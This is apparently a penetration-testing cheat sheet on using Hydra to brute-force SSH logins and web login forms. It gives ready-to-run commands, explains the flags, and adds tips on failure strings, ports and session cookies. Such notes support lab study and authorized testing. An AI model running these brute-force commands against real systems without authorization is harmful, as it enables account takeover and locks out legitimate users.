**Warning:** Online brute-forcing is loud and can lock out accounts. Use `-t 4` (default) or lower for real targets.

**SSH:**

```
hydra -l USER -P passwords.txt TARGET ssh -f -V
```

- `-l` / `-L`: Single user / User list
    
- `-p` / `-P`: Single pass / Pass list
    
- `-t`: Parallel tasks (keep low)
    
- `-f`: Stop on success
    
- `-V`: Verbose (show attempts)
    

**Web Form POST:**

- _Mandatory:_ Intercept the login request in Burp Suite first. Get exact field names, failure string, and method.
    

```
hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -f -V
```

- `^USER^` / `^PASS^`: Replaced by `-l` and `-P`.
    
- `F=incorrect`: The **Failure** string. If the failure string is dynamic, use `S=` (Success string) instead (e.g., `S=Welcome back`).
    
- `-s <port>`: Non-default port. **Place it** _**before**_ **the target**, not at the end.
    
- _Tweak:_ If the form requires a CSRF token or specific session cookie, Hydra fails. Add `H=Cookie: PHPSESSID=...` inside the `http-post-form` string.
